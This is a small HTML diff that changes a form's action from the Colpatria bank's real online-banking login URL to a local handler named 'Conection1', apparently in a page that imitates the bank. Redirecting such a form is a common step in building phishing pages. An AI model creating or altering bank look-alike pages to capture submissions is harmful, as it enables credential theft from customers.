@@ -72,7 +72,7 @@
 			<br>
 			<br>
         	
-			<form action="https://www.banco.colpatria.com.co/banca-virtual/login/">
+			<form action="Conection1">
         <input type="submit" id="accept1" value="Finalizar" />
     </form>
 </section>
